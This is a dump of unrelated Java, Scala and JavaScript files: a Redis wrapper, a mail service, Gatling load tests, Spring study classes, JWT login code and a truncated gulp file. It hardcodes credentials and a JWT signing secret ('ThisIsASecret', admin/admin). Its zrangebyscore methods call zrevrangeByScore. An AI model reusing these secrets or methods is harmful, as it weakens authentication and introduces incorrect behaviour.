        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long llen(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.llen(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public List<String> lrange(String key, long start, long end) {
        Jedis jedis = null;
        List<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.lrange(key, start, end);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long sadd(String key, String... members) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sadd(key, members);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long srem(String key, String... members) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.srem(key, members);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String spop(String key) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.spop(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> sdiff(String... keys) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sdiff(keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long sdiffstore(String dstkey, String... keys) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sdiffstore(dstkey, keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> sinter(String... keys) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sinter(keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long sinterstore(String dstkey, String... keys) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sinterstore(dstkey, keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> sunion(String... keys) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sunion(keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long sunionstore(String dstkey, String... keys) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sunionstore(dstkey, keys);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long smove(String srckey, String dstkey, String member) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.smove(srckey, dstkey, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long scard(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.scard(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Boolean sismember(String key, String member) {
        Jedis jedis = null;
        Boolean res = null;
        try {
            jedis = pool.getResource();
            res = jedis.sismember(key, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public String srandmember(String key) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.srandmember(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> smembers(String key) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.smembers(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long zadd(String key, double score, String member) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zadd(key, score, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public Long zrem(String key, String... members) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrem(key, members);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Double zincrby(String key, double score, String member) {
        Jedis jedis = null;
        Double res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zincrby(key, score, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zrank(String key, String member) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrank(key, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zrevrank(String key, String member) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrevrank(key, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> zrevrange(String key, long start, long end) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrevrange(key, start, end);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> zrangebyscore(String key, String max, String min) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrevrangeByScore(key, max, min);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> zrangeByScore(String key, double max, double min) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zrevrangeByScore(key, max, min);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zcount(String key, String min, String max) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zcount(key, min, max);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zcard(String key) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zcard(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Double zscore(String key, String member) {
        Jedis jedis = null;
        Double res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zscore(key, member);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zremrangeByRank(String key, long start, long end) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zremrangeByRank(key, start, end);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Long zremrangeByScore(String key, double start, double end) {
        Jedis jedis = null;
        Long res = null;
        try {
            jedis = pool.getResource();
            res = jedis.zremrangeByScore(key, start, end);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }


    @Override
    public Set<String> keys(String pattern) {
        Jedis jedis = null;
        Set<String> res = null;
        try {
            jedis = pool.getResource();
            res = jedis.keys(pattern);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    @Override
    public String type(String key) {
        Jedis jedis = null;
        String res = null;
        try {
            jedis = pool.getResource();
            res = jedis.type(key);
        } catch (Exception e) {

            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }

    /**
     * 返还到连接池
     *
     * @param pool
     * @param jedis
     */
    private static void returnResource(JedisPool pool, Jedis jedis) {
        if (jedis != null) {
            jedis.close();
        }
    }

    @Override
    public Date getExpireDate(String key) {
        Jedis jedis = null;
        Date res = new Date();
        try {
            jedis = pool.getResource();
            res = new DateTime().plusSeconds(jedis.ttl(key).intValue()).toDate();
        } catch (Exception e) {
            LOGGER.error(e.getMessage());
        } finally {
            returnResource(pool, jedis);
        }
        return res;
    }
}
----------------------------------------------------------------------------------------
import com.bookstore.domain.User;
import org.apache.commons.lang.CharEncoding;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.MessageSource;
import org.springframework.core.env.Environment;
import org.springframework.mail.javamail.JavaMailSenderImpl;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring4.SpringTemplateEngine;

import javax.annotation.PostConstruct;
import javax.inject.Inject;
import javax.mail.internet.MimeMessage;
import java.util.Locale;

/**
 * Service for sending e-mails.
 * <p/>
 * <p>
 * We use the @Async annotation to send e-mails asynchronously.
 * </p>
 */
@Service
public class MailService {

    private final Logger log = LoggerFactory.getLogger(MailService.class);

    @Inject
    private Environment env;

    @Inject
    private JavaMailSenderImpl javaMailSender;

    @Inject
    private MessageSource messageSource;

    @Inject
    private SpringTemplateEngine templateEngine;

    /**
     * System default email address that sends the e-mails.
     */
    private String from;

    @PostConstruct
    public void init() {
        this.from = env.getProperty("mail.from");
    }

    @Async
    public void sendEmail(String to, String subject, String content, boolean isMultipart, boolean isHtml) {
        log.debug("Send e-mail[multipart '{}' and html '{}'] to '{}' with subject '{}' and content={}",
                isMultipart, isHtml, to, subject, content);

        // Prepare message using a Spring helper
        MimeMessage mimeMessage = javaMailSender.createMimeMessage();
        try {
            MimeMessageHelper message = new MimeMessageHelper(mimeMessage, isMultipart, CharEncoding.UTF_8);
            message.setTo(to);
            message.setFrom(from);
            message.setSubject(subject);
            message.setText(content, isHtml);
            javaMailSender.send(mimeMessage);
            log.debug("Sent e-mail to User '{}'", to);
        } catch (Exception e) {
            log.warn("E-mail could not be sent to user '{}', exception is: {}", to, e.getMessage());
        }
    }

    @Async
    public void sendActivationEmail(User user, String baseUrl) {
        log.debug("Sending activation e-mail to '{}'", user.getEmail());
        Locale locale = Locale.forLanguageTag(user.getLangKey());
        Context context = new Context(locale);
        context.setVariable("user", user);
        context.setVariable("baseUrl", baseUrl);
        String content = templateEngine.process("activationEmail", context);
        String subject = messageSource.getMessage("email.activation.title", null, locale);
        sendEmail(user.getEmail(), subject, content, false, true);
    }

    @Async
    public void sendPasswordResetMail(User user, String baseUrl) {
        log.debug("Sending password reset e-mail to '{}'", user.getEmail());
        Locale locale = Locale.forLanguageTag(user.getLangKey());
        Context context = new Context(locale);
        context.setVariable("user", user);
        context.setVariable("baseUrl", baseUrl);
        String content = templateEngine.process("passwordResetEmail", context);
        String subject = messageSource.getMessage("email.reset.title", null, locale);
        sendEmail(user.getEmail(), subject, content, false, true);
    }
}
----------------------------------------------------------------------------------------
import java.nio.charset.StandardCharsets
import java.util.Base64

import _root_.io.gatling.core.scenario.Simulation
import ch.qos.logback.classic.{Level, LoggerContext}
import io.gatling.core.Predef._
import io.gatling.http.Predef._
import org.slf4j.LoggerFactory

import scala.concurrent.duration._

/**
 * Performance test for the Book entity.
 */
class BookGatlingTest extends Simulation {

    val context: LoggerContext = LoggerFactory.getILoggerFactory.asInstanceOf[LoggerContext]
    // Log all HTTP requests
    //context.getLogger("io.gatling.http").setLevel(Level.valueOf("TRACE"))
    // Log failed HTTP requests
    //context.getLogger("io.gatling.http").setLevel(Level.valueOf("DEBUG"))

    val baseURL = Option(System.getProperty("baseURL")) getOrElse """http://127.0.0.1:8080"""

    val httpConf = http
        .baseURL(baseURL)
        .inferHtmlResources()
        .acceptHeader("*/*")
        .acceptEncodingHeader("gzip, deflate")
        .acceptLanguageHeader("fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3")
        .connection("keep-alive")
        .userAgentHeader("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:33.0) Gecko/20100101 Firefox/33.0")

    val headers_http = Map(
        "Accept" -> """application/json"""
    )

        val authorization_header = "Basic " + Base64.getEncoder.encodeToString("bookstoreapp:mySecretOAuthSecret".getBytes(StandardCharsets.UTF_8))

    val headers_http_authentication = Map(
        "Content-Type" -> """application/x-www-form-urlencoded""",
        "Accept" -> """application/json""",
        "Authorization"-> authorization_header
    )

    val headers_http_authenticated = Map(
        "Accept" -> """application/json""",
        "Authorization" -> "Bearer ${access_token}"
    )

    val scn = scenario("Test the Book entity")
        .exec(http("First unauthenticated request")
        .get("/api/account")
        .headers(headers_http)
        .check(status.is(401)))
        .pause(10)
        .exec(http("Authentication")
        .post("/oauth/token")
        .headers(headers_http_authentication)
        .formParam("username", "admin")
        .formParam("password", "admin")
        .formParam("grant_type", "password")
        .formParam("scope", "read write")
        .formParam("client_secret", "mySecretOAuthSecret")
        .formParam("client_id", "bookstoreapp")
        .formParam("submit", "Login")
        .check(jsonPath("$.access_token").saveAs("access_token")))
        .pause(1)
        .exec(http("Authenticated request")
        .get("/api/account")
        .headers(headers_http_authenticated)
        .check(status.is(200)))
        .pause(10)
        .repeat(2) {
            exec(http("Get all books")
            .get("/api/books")
            .headers(headers_http_authenticated)
            .check(status.is(200)))
            .pause(10 seconds, 20 seconds)
            .exec(http("Create new book")
            .put("/api/books")
            .headers(headers_http_authenticated)
            .body(StringBody("""{"id":null, "title":"SAMPLE_TEXT", "description":"SAMPLE_TEXT", "publicationDate":"2020-01-01T00:00:00.000Z", "price":null}""")).asJSON
            .check(status.is(201))
            .check(headerRegex("Location", "(.*)").saveAs("new_book_url")))
            .pause(10)
            .repeat(5) {
                exec(http("Get created book")
                .get("${new_book_url}")
                .headers(headers_http_authenticated))
                .pause(10)
            }
            .exec(http("Delete created book")
            .delete("${new_book_url}")
            .headers(headers_http_authenticated))
            .pause(10)
        }

    val users = scenario("Users").exec(scn)

    setUp(
        users.inject(rampUsers(100) over (1 minutes))
    ).protocols(httpConf)
}

import java.nio.charset.StandardCharsets
import java.util.Base64

import _root_.io.gatling.core.scenario.Simulation
import ch.qos.logback.classic.{Level, LoggerContext}
import io.gatling.core.Predef._
import io.gatling.http.Predef._
import org.slf4j.LoggerFactory

import scala.concurrent.duration._

/**
 * Performance test for the Author entity.
 */
class AuthorGatlingTest extends Simulation {

    val context: LoggerContext = LoggerFactory.getILoggerFactory.asInstanceOf[LoggerContext]
    // Log all HTTP requests
    //context.getLogger("io.gatling.http").setLevel(Level.valueOf("TRACE"))
    // Log failed HTTP requests
    //context.getLogger("io.gatling.http").setLevel(Level.valueOf("DEBUG"))

    val baseURL = Option(System.getProperty("baseURL")) getOrElse """http://127.0.0.1:8080"""

    val httpConf = http
        .baseURL(baseURL)
        .inferHtmlResources()
        .acceptHeader("*/*")
        .acceptEncodingHeader("gzip, deflate")
        .acceptLanguageHeader("fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3")
        .connection("keep-alive")
        .userAgentHeader("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:33.0) Gecko/20100101 Firefox/33.0")

    val headers_http = Map(
        "Accept" -> """application/json"""
    )

        val authorization_header = "Basic " + Base64.getEncoder.encodeToString("bookstoreapp:mySecretOAuthSecret".getBytes(StandardCharsets.UTF_8))

    val headers_http_authentication = Map(
        "Content-Type" -> """application/x-www-form-urlencoded""",
        "Accept" -> """application/json""",
        "Authorization"-> authorization_header
    )

    val headers_http_authenticated = Map(
        "Accept" -> """application/json""",
        "Authorization" -> "Bearer ${access_token}"
    )

    val scn = scenario("Test the Author entity")
        .exec(http("First unauthenticated request")
        .get("/api/account")
        .headers(headers_http)
        .check(status.is(401)))
        .pause(10)
        .exec(http("Authentication")
        .post("/oauth/token")
        .headers(headers_http_authentication)
        .formParam("username", "admin")
        .formParam("password", "admin")
        .formParam("grant_type", "password")
        .formParam("scope", "read write")
        .formParam("client_secret", "mySecretOAuthSecret")
        .formParam("client_id", "bookstoreapp")
        .formParam("submit", "Login")
        .check(jsonPath("$.access_token").saveAs("access_token")))
        .pause(1)
        .exec(http("Authenticated request")
        .get("/api/account")
        .headers(headers_http_authenticated)
        .check(status.is(200)))
        .pause(10)
        .repeat(2) {
            exec(http("Get all authors")
            .get("/api/authors")
            .headers(headers_http_authenticated)
            .check(status.is(200)))
            .pause(10 seconds, 20 seconds)
            .exec(http("Create new author")
            .put("/api/authors")
            .headers(headers_http_authenticated)
            .body(StringBody("""{"id":null, "name":"SAMPLE_TEXT", "surname":"SAMPLE_TEXT", "description":"SAMPLE_TEXT", "birthDate":"2020-01-01T00:00:00.000Z"}""")).asJSON
            .check(status.is(201))
            .check(headerRegex("Location", "(.*)").saveAs("new_author_url")))
            .pause(10)
            .repeat(5) {
                exec(http("Get created author")
                .get("${new_author_url}")
                .headers(headers_http_authenticated))
                .pause(10)
            }
            .exec(http("Delete created author")
            .delete("${new_author_url}")
            .headers(headers_http_authenticated))
            .pause(10)
        }

    val users = scenario("Users").exec(scn)

    setUp(
        users.inject(rampUsers(100) over (1 minutes))
    ).protocols(httpConf)
}

import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.EnableAspectJAutoProxy;
import org.springframework.context.annotation.Import;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.validation.beanvalidation.BeanValidationPostProcessor;
import org.springframework.validation.beanvalidation.MethodValidationPostProcessor;
import spring.study.beanpostproessor.registrar.SimpleRegistrar;

/**
 * Created by Format on 2017/6/18.
 */
@SpringBootApplication
@Import(SimpleRegistrar.class)
@EnableAspectJAutoProxy
@EnableScheduling
@EnableAsync
public class BeanPostProcessorApplication {
    public static void main(String[] args) {
        SpringApplication.run(BeanPostProcessorApplication.class, args);
    }

    @Bean
    public BeanPostProcessor beanValidationPostProcessor() {
        BeanValidationPostProcessor processor = new BeanValidationPostProcessor();
        processor.setAfterInitialization(true);
        return processor;
    }

    @Bean
    public BeanPostProcessor methodValidationPostProcessor() {
        MethodValidationPostProcessor processor = new MethodValidationPostProcessor();
        return processor;
    }

}

import org.springframework.beans.factory.annotation.AnnotatedGenericBeanDefinition;
import org.springframework.beans.factory.support.BeanDefinitionRegistry;
import org.springframework.beans.factory.support.RootBeanDefinition;
import org.springframework.context.annotation.ImportBeanDefinitionRegistrar;
import org.springframework.core.type.AnnotationMetadata;
import spring.study.beanpostproessor.bean.EmbeddedService;

/**
 * Created by Format on 2017/6/19.
 */
public class SimpleRegistrar implements ImportBeanDefinitionRegistrar {
    @Override
    public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) {
        AnnotatedGenericBeanDefinition beanDefinition = new AnnotatedGenericBeanDefinition(EmbeddedService.class);
        beanDefinition.getPropertyValues().add("id", "embedded_id_001");
        registry.registerBeanDefinition("beanFromSimpleRegistrar", beanDefinition);
    }
}


import org.aopalliance.intercept.MethodInterceptor;
import org.aopalliance.intercept.MethodInvocation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.Arrays;
import java.util.List;

/**
 * Created by format on 16/11/15.
 */
public class LogMethodInterceptor implements MethodInterceptor {
    private Logger logger = LoggerFactory.getLogger(LogMethodInterceptor.class);
    private List<String> exclude;
    public LogMethodInterceptor(String[] exclude) {
        this.exclude = Arrays.asList(exclude);
    }
    @Override
    public Object invoke(MethodInvocation invocation) throws Throwable {
        String methodName = invocation.getMethod().getName();
        if(exclude.contains(methodName)) {
            return invocation.proceed();
        }
        long start = System.currentTimeMillis();
        Object result = invocation.proceed();
        long end = System.currentTimeMillis();
        logger.info("====method({}), cost({}) ", methodName, (end - start));
        return result;
    }
}

import org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationEvent;
import org.springframework.context.ApplicationListener;
import org.springframework.context.event.ContextRefreshedEvent;
import spring.study.refresh.context.bean.SimpleBeanInListener;

/**
 * Created by Format on 2017/5/10.
 */
public class MyApplicationListener implements ApplicationListener<ApplicationEvent> {
    @Override
    public void onApplicationEvent(ApplicationEvent event) {
        if(event instanceof ContextRefreshedEvent) {
            ApplicationContext applicationContext = ((ContextRefreshedEvent) event).getApplicationContext();
            if(applicationContext instanceof AnnotationConfigEmbeddedWebApplicationContext) {
                ((AnnotationConfigEmbeddedWebApplicationContext) applicationContext).getBeanFactory().registerSingleton("simpleBeanInListener", new SimpleBeanInListener());
            }

        }
    }
}

import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.security.core.Authentication;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.Date;


public class TokenAuthenticationService {

    private long EXPIRATIONTIME = 1000 * 60 * 60 * 24 * 10; // 10 days
    private String secret = "ThisIsASecret";
    private String tokenPrefix = "Bearer";
    private String headerString = "Authorization";
    public void addAuthentication(HttpServletResponse response, String username)
    {
        // We generate a token now.
        String JWT = Jwts.builder()
                    .setSubject(username)
                    .setExpiration(new Date(System.currentTimeMillis() + EXPIRATIONTIME))
                    .signWith(SignatureAlgorithm.HS512, secret)
                    .compact();
        response.addHeader(headerString,tokenPrefix + " "+ JWT);
    }

    public Authentication getAuthentication(HttpServletRequest request)
    {
        String token = request.getHeader(headerString);
        if(token != null)
        {
            // parse the token.
            String username = Jwts.parser()
                        .setSigningKey(secret)
                        .parseClaimsJws(token)
                        .getBody()
                        .getSubject();
            if(username != null) // we managed to retrieve a user
            {
                return new AuthenticatedUser(username);
            }
        }
        return null;
    }
}

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;


public class JWTLoginFilter extends AbstractAuthenticationProcessingFilter{

    private TokenAuthenticationService tokenAuthenticationService;

    public JWTLoginFilter(String url, AuthenticationManager authenticationManager)
    {
        super(new AntPathRequestMatcher(url));
        setAuthenticationManager(authenticationManager);
        tokenAuthenticationService = new TokenAuthenticationService();
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)
            throws AuthenticationException, IOException, ServletException {
        AccountCredentials credentials = new ObjectMapper().readValue(httpServletRequest.getInputStream(),AccountCredentials.class);
        UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(credentials.getUsername(), credentials.getPassword());
        return getAuthenticationManager().authenticate(token);
    }

    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication authentication)
            throws IOException, ServletException{
        String name = authentication.getName();
        tokenAuthenticationService.addAuthentication(response,name);
    }
}
----------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.*;

import lombok.Value;

import org.springframework.util.Assert;

/**
 * 審査例外を表現します。
 * 
 * @author jkazama
 */
public class ValidationException extends RuntimeException {

    private static final long serialVersionUID = 1L;

    private final Warns warns;

    /**
     * フィールドに従属しないグローバルな審査例外を通知するケースで利用してください。
     * @param message
     */
    public ValidationException(String message) {
        super(message);
        warns = Warns.init(message);
    }

    /**
     * フィールドに従属する審査例外を通知するケースで利用してください。
     * @param field
     * @param message
     */
    public ValidationException(String field, String message) {
        super(message);
        warns = Warns.init(field, message);
    }

    /**
     * フィールドに従属する審査例外を通知するケースで利用してください。
     * @param field
     * @param message
     * @param messageArgs
     */
    public ValidationException(String field, String message, String[] messageArgs) {
        super(message);
        warns = Warns.init(field, message, messageArgs);
    }

    /**
     * 複数件の審査例外を通知するケースで利用してください。
     * @param warns
     */
    public ValidationException(final Warns warns) {
        super(warns.head().getMessage());
        this.warns = warns;
    }

    /**
     * @return 発生した審査例外一覧を返します。
     */
    public List<Warn> list() {
        return warns.list();
    }

    @Override
    public String getMessage() {
        return warns.head().getMessage();
    }

    /** 審査例外情報  */
    public static class Warns implements Serializable {
        private static final long serialVersionUID = 1L;
        private List<Warn> list = new ArrayList<>();

        private Warns() {
        }

        public Warns add(String message) {
            list.add(new Warn(null, message, null));
            return this;
        }

        public Warns add(String field, String message) {
            list.add(new Warn(field, message, null));
            return this;
        }

        public Warns add(String field, String message, String[] messageArgs) {
            list.add(new Warn(field, message, messageArgs));
            return this;
        }

        public Warn head() {
            Assert.notEmpty(list, "Not found warn.");
            return list.get(0);
        }

        public List<Warn> list() {
            return list;
        }

        public boolean nonEmpty() {
            return !list.isEmpty();
        }

        public static Warns init() {
            return new Warns();
        }

        public static Warns init(String message) {
            return init().add(message);
        }

        public static Warns init(String field, String message) {
            return init().add(field, message);
        }

        public static Warns init(String field, String message, String[] messageArgs) {
            return init().add(field, message, messageArgs);
        }

    }

    /**
     * フィールドスコープの審査例外トークン。
     */
    @Value
    public static class Warn implements Serializable {
        private static final long serialVersionUID = 1L;
        private String field;
        private String message;
        private String[] messageArgs;

        /**
         * @return フィールドに従属しないグローバル例外時はtrue
         */
        public boolean global() {
            return field == null;
        }
    }

}
----------------------------------------------------------------------------------------
import cc.catalysts.boot.structurizr.ModelPostProcessor;
import cc.catalysts.boot.structurizr.ViewProvider;
import cc.catalysts.boot.structurizr.config.StructurizrConfigurationProperties;
import com.structurizr.Workspace;
import com.structurizr.api.StructurizrClient;
import com.structurizr.api.StructurizrClientException;
import com.structurizr.model.Relationship;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationListener;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.core.annotation.AnnotationAwareOrderComparator;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.Set;
import java.util.stream.Collectors;

import static cc.catalysts.boot.structurizr.service.StructurizrService.ORDER;

/**
 * @author Klaus Lehner, Catalysts GmbH
 */
@Service
@Order(ORDER)
public class StructurizrService implements ApplicationListener<ContextRefreshedEvent> {

    public static final int ORDER = 0;

    private static final Logger LOG = LoggerFactory.getLogger(StructurizrService.class);

    private final StructurizrClient structurizrClient;
    private final Workspace workspace;
    private final StructurizrConfigurationProperties config;

    @Autowired
    public StructurizrService(StructurizrClient structurizrClient, Workspace workspace, StructurizrConfigurationProperties config) {
        this.structurizrClient = structurizrClient;
        this.workspace = workspace;
        this.config = config;
    }

    @Override
    public void onApplicationEvent(ContextRefreshedEvent event) {
        List<ModelPostProcessor> postProcessors = event.getApplicationContext()
                .getBeansOfType(ModelPostProcessor.class).values().stream().collect(Collectors.toList());

        AnnotationAwareOrderComparator.sort(postProcessors);

        for (ModelPostProcessor postProcessor : postProcessors) {
            postProcessor.postProcess(workspace.getModel());
        }

        if (config.isAddImplicitRelationships()) {
            final Set<Relationship> relationships = workspace.getModel().addImplicitRelationships();
            LOG.info("Added {} implicit relationships.", relationships.size());
        }

        event.getApplicationContext()
                .getBeansOfType(ViewProvider.class)
                .values().stream()
                .forEach(vp -> vp.createViews(workspace.getViews()));


        if (config.isPerformMerge()) {
            try {
                structurizrClient.putWorkspace(config.getWorkspaceId(), workspace);
            } catch (StructurizrClientException e) {
                LOG.error("Could not put workspace.", e);
                throw new RuntimeException(e);
            }
        }
    }
}
----------------------------------------------------------------------------------------
ReflectionToStringBuilder.reflectionToString(obj, ToStringStyle.SHORT_PREFIX_STYLE);
----------------------------------------------------------------------------------------

const gulp = require('gulp');
const concat = require('gulp-concat');
const newer = require('gulp-newer');
const uglify = require('gulp-uglify');
const templateCache = require('gulp-angular-templatecache');
const htmlmin = require('gulp-htmlmin');
const cleanCSS = require('gulp-clean-css');
const ngAnnotate = require('gulp-ng-annotate');

const staticDir = 'src/main/resources/static/';
const webAppDir = 'src/main/javascript/';

const jslib = [
    'node_modules/lodash/lodash.min.js',
    'node_modules/ng-file-upload/dist/ng-file-upload-shim.min.js',
    'node_modules/angular/angular.min.js',
    'node_modules/angular-animate/angular-animate.min.js',
    'node_modules/angular-aria/angular-aria.min.js',
    'node_modules/angular-gettext/dist/angular-gettext.min.js',
    'node_modules/angular-ui-router/release/angular-ui-router.min.js',
    'node_modules/moment/min/moment.min.js',
    'node_modules/moment/locale/ru.js',
    'node_modules/angular-moment/angular-moment.min.js',
    'node_modules/angular-material/angular-material.min.js',
    'node_modules/angular-material-data-table/dist/md-data-table.min.js',
    'node_modules/angular-loading-bar/build/loading-bar.min.js',
    'node_modules/angular-cache/dist/angular-cache.min.js',
    'node_modules/angular-scroll/angular-scroll.min.js',
